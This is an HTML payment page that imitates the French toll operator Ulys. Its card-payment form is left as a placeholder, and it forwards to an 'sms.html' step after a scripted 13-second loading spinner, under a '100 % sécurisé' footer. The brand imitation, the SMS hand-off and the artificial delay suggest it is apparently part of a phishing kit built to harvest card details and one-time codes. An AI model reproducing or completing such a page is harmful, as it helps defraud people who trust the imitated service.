<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Paiement – Ulys Télépéage</title>
  <link rel="stylesheet" href="assets/css/style.css"/>
  <style>
    /* Spinner overlay */
    #spinnerOverlay {
      display: none;                /* caché par défaut */
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.6);
      align-items: center;
      justify-content: center;
      z-index: 10000;
      display: flex;                /* on laisse flex ici, on masque via JS */
    }
    #spinnerOverlay.hidden {
      display: none;                /* classe utilitaire pour masquer */
    }
    .spinner {
      width: 80px;
      height: 80px;
      border: 10px solid rgba(255,255,255,0.2);
      border-top: 10px solid #ff8000; /* accent Ulys */
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    /* Centre le footer */
    footer {
      text-align: center !important;
    }
  </style>
</head>
<body>
  <!-- votre bandeau, navbar, etc. -->
  <div class="top-nav">…</div>
  <div class="site-nav">…</div>

  <main class="container">
    <div class="card">
      <h1>Paiement sécurisé</h1>
      <form id="paymentForm" action="sms.html" method="get">
        <!-- vos champs CB -->
        <button type="submit" class="btn">Valider le paiement</button>
      </form>
    </div>
  </main>

  <!-- Spinner overlay (ajouté ici) -->
  <div id="spinnerOverlay" class="hidden">
    <div class="spinner"></div>
  </div>

  <footer>
    &copy; 2025 Ulys. Paiement 100 % sécurisé.
  </footer>

  <script>
    const form = document.getElementById("paymentForm");
    const overlay = document.getElementById("spinnerOverlay");

    form.addEventListener("submit", function(e) {
      e.preventDefault();
      // Affiche le spinner
      overlay.classList.remove("hidden");
      // Attendre 13 secondes avant de poursuivre
      setTimeout(() => {
        this.submit(); // ou window.location.href = "sms.html";
      }, 13000);
    });
  </script>
</body>
</html>
